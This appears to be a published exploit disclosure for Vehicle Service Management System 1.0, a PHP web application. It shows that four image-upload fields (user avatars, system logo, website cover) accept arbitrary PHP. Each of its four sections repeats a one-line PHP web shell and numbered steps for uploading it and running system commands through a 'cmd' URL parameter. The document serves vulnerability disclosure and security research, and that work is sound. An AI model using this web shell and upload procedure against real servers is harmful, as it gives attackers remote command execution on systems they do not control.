# Vehicle Service Management System - 'Multiple' File upload Leads to Code Execution
Vehicle Service Management System - 'Multiple' File upload Leads to Code Execution

### Exploit Title: Vehicle Service Management System - 'Multiple' File upload Leads to Code Execution
### Date: 29/12/2021
### Exploit Author: P.L.Sanu
### Exploit Author Website: https://www.plsanu.com
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/14972/vehicle-service-management-system-php-free-source-code.html
### Version: <= 1.0
### Tested on: Windows 10
### CVE : 
### Google Dork: N/A
### Reference: 
- https://www.plsanu.com/vehicle-service-management-system-multiple-file-upload-leads-to-code-execution
- https://github.com/plsanu/Vehicle-Service-Management-System-Multiple-File-upload-Leads-to-Code-Execution

### 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user


### Code:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In My Account Section enter all the required details and browse the php file in Avatar.
5. Click on update button.
6. Open the avatar image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to User List section and click on Create New button.

### Code:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In Create New User Page enter all the required details and browse the php file in Avatar.
5. Click on Save button.
6. Open the avatar image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Code:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In Settings Section enter all the required details and browse the php file in System Logo.
5. Click on update button.
6. Open the System Logo image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Code:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In Settings Section enter all the required details and browse the php file in Website Cover.
5. Click on update button.
6. Open the Website Cover image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..
